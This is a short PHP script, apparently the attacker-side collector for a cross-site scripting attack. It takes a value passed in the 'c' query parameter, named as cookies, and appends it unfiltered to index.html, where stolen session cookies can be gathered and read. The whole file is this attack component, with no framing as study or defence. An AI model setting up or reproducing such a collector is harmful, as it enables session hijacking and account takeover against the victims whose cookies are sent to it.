<?php
$cookies = $_GET["c"];
$file = fopen("index.html", 'a');
fwrite($file, $cookies);
fwrite($file, "\n\n");
?>
